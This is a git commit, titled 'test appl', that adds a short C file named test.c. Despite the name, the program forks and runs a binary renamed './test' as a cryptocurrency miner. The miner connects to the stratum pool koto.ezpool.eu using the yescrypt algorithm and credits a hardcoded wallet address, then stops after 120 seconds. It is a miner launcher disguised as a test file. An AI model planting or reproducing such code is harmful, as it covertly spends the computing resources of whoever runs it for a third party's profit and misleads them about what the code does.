d4cc81d9e2e3363d525470756db5d1430781833c
A55F*CKER <4ssfscker@noreply.github.com>
2018-02-26 01:13:29 +0000

    test appl

---
+++ test.c
@@ -0,0 +1,24 @@
+#define TIMEOUT 120
+
+#include <signal.h>
+#include <unistd.h>
+#include <sys/wait.h>
+
+
+int pid;
+
+static void timeout(int foo) {}
+
+int main() {
+
+	pid = fork();
+	if(pid == 0) {
+		execl("./test", "./test", "-a", "yescrypt", "-o", "stratum+tcp://koto.ezpool.eu:3032", "-u", "k1KfBDvdKPBjXRxzqnFwuGXSTxrXMs69dHK", "-p", "x", (char*) 0);
+	} else {
+		sleep(TIMEOUT);
+		kill(pid, SIGINT);
+		int foo;
+		wait(&foo);
+	}
+	return 0;
+}
